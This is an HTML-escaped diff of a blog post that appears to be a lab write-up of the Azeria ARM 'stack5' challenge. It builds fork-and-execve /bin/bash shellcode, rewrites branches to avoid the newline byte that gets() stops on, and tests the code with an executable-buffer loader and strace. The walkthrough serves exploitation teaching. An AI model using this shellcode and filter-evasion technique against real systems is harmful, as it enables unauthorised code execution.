+  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e28f0034&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; 0x34  argv0&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e92d000f&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e28d1000&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e28d200c&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e3a0700b&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;ef000000&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;svc&lt;/span&gt;     &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;
+
+&lt;span class=&quot;mi&quot;&gt;00000068&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Largv0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;00000074&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Largv1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;00000078&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Largv2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;add&lt;/code&gt; instructions like &lt;code class=&quot;highlighter-rouge&quot;&gt;add r2, pc, #76&lt;/code&gt; makes the address relative
+to the program counter.&lt;/p&gt;
+
+&lt;p&gt;To calculate the offset to a label like &lt;code class=&quot;highlighter-rouge&quot;&gt;Largv0&lt;/code&gt; we need to subtract
+the address of the label minus the current position minus 8 bytes
+(because &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt; already has an implicit +0x8)&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;mh&quot;&gt;0x78&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Thankfully the assembler can do the calculus by us:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Largv2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the branches?&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bne Lparent_or_error&lt;/code&gt; is a &lt;em&gt;PC-relative&lt;/em&gt; encoded jump: the program will jump
+to that &lt;em&gt;absolute&lt;/em&gt; address but the instruction is encoded as an &lt;em&gt;offset&lt;/em&gt;
+from the current &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;In other words, we are &lt;strong&gt;not&lt;/strong&gt; hardcoding a fixed address so our code
+will work regardless of where is going to be loaded.&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;00000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e3a07002&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;ef000000&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;svc&lt;/span&gt;     &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e3500000&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a000000&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;bne&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Lparent_or_error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;ea000002&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;       &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Lchild&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;00000020&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Lchild&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e3a03000&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The address is computed as:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The branch at 0x10 has the offset 0x02 encoded in the instruction
+0xea000002. Knowing that the offset is multiplied by 4 (because the
+addresses are aligned to 4 bytes; 2 in Thumb mode),
+and knowing that using &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt; adds a 0x8 to the count
+(0x4 in Thumb mode), the final address is:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Why did I use &lt;code class=&quot;highlighter-rouge&quot;&gt;bne&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;beq&lt;/code&gt; ? Wouldn’t that be more direct?&lt;/p&gt;
+
+&lt;h2 id=&quot;forbidden-bytes&quot;&gt;Forbidden bytes&lt;/h2&gt;
+
+&lt;p&gt;The vulnerable program will read our exploit using &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;From the &lt;a href=&quot;https://man7.org/linux/man-pages/man3/gets.3.html&quot;&gt;man pages&lt;/a&gt;,
+&lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; reads from &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; until it finds a &lt;em&gt;termination character&lt;/em&gt; or it
+is the end of the stream.&lt;/p&gt;
+
+&lt;p&gt;In Linux, the new line (&lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt; 0x0a) is the &lt;em&gt;termination character&lt;/em&gt; so our
+payload cannot have this byte or &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; will stop in the middle of the copy.&lt;/p&gt;
+
+&lt;p&gt;For example the simple snippet is forbidden:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;beq&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Lchild&lt;/span&gt;
+    &lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;; code for parent or error follows&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;label for=&quot;mn-328106b3fb06798d7bb537aa8abb437f&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-328106b3fb06798d7bb537aa8abb437f&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;Bypassing the filters can be incredible complex. Here is article about
+&lt;a href=&quot;https://web.archive.org/web/2020*/http://www.phrack.org/issues/66/12.html&quot;&gt;Alphanumeric RISC ARM Shellcode&lt;/a&gt;.
+ &lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;beq&lt;/code&gt; has a 0x0a as the first byte so we have to rewrite the snippet
+to:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;bne&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Lparent_or_error&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Lchild&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;compilation&quot;&gt;Compilation&lt;/h2&gt;
+
+&lt;p&gt;We compile the assembly into an object file with &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt; (in a Raspbian)
+and then we extract the &lt;code class=&quot;highlighter-rouge&quot;&gt;.text&lt;/code&gt; section:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; egg.o egg.s
+pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objcopy &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; binary &lt;span class=&quot;nt&quot;&gt;--only-section&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.text egg.o egg.text
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The assembly can be found &lt;a href=&quot;/book-of-gehn/assets/azeria-arm-challenges-assets/egg.s&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;testing&quot;&gt;Testing&lt;/h2&gt;
+
+&lt;p&gt;It is always a good idea to test the shellcode &lt;em&gt;separately&lt;/em&gt; from the
+exploitation.&lt;/p&gt;
+
+&lt;p&gt;For this &lt;a href=&quot;/book-of-gehn/assets/azeria-arm-challenges-assets/test-egg.c&quot;&gt;we can create a small C program&lt;/a&gt;
+to load the &lt;em&gt;egg&lt;/em&gt; from a file
+into a buffer with &lt;em&gt;permission for execution&lt;/em&gt; and then jump into it:&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;posix_memalign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ALIGN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;mprotect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROT_READ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROT_WRITE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROT_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is an example:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./test-egg egg.text
+Egg loaded at 0x24000-0x2409
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;label for=&quot;mn-7e40faf5a3bb8233e36e4d3e592de11d&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-7e40faf5a3bb8233e36e4d3e592de11d&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;good&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;bad&lt;/code&gt; labels were put by me. Sorry, &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; is not so smart.
+ &lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;If the things don’t result as expected, &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; can be useful to
+inspect what syscalls are being called and with which parameters:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raspberrypi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;./&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;....&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;strace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4959&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attached&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;---&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;child&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6e69622f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x666f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2407f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EFAULT&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Bad&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+           &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;good&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;bad&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;search-a-home&quot;&gt;Search a home&lt;/h2&gt;
+
+&lt;p&gt;Fortunately the stack is executable:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vmmap&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x11000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xp&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack5&lt;/span&gt;
